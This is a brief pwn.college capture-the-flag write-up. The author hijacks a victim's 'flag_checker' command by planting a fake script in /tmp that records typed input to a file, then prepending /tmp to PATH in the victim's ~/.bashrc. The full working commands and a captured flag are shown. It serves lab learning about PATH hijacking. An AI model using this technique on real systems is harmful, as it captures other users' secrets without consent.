### Challenge

To collect the flag by exploiting  write access to Zardus’s `~/.bashrc` to hijack the `flag_checker` command

### Thought Process

In this challenge Zardus will run a command called `flag_checker` and manually type the flag into it. I need to intercept this by creating a fake `flag_checker` that runs first. So firstly, I'll have to create a script that will intercept the flag. Then make the shell look in `/tmp` first, so it will find my `flag_checker` before the real one

### Solution

```bash
hacker@shenanigans~sniffing-input:~$ echo -e '#!/bin/bash\necho "Type the flag"\nread flag\necho "$flag" > /tmp/captured_flag\necho "$flag"' > /tmp/flag_checker
hacker@shenanigans~sniffing-input:~$ chmod +x /tmp/flag_checker
hacker@shenanigans~sniffing-input:~$ echo 'export PATH=/tmp:$PATH' >> /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: *********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag
************************************************************pwn.college{Ed5WxMkCXRA0PgUS7GXAfO8nCEs.QX1MTM3EDLyMjN0czW}
zardus@shenanigans~sniffing-input:~$ exit
logout
```

Upon exection, I got the next clue. After a series of such clues which were found using the commands `cat`, `ls` and `ls -a`, I got the flag
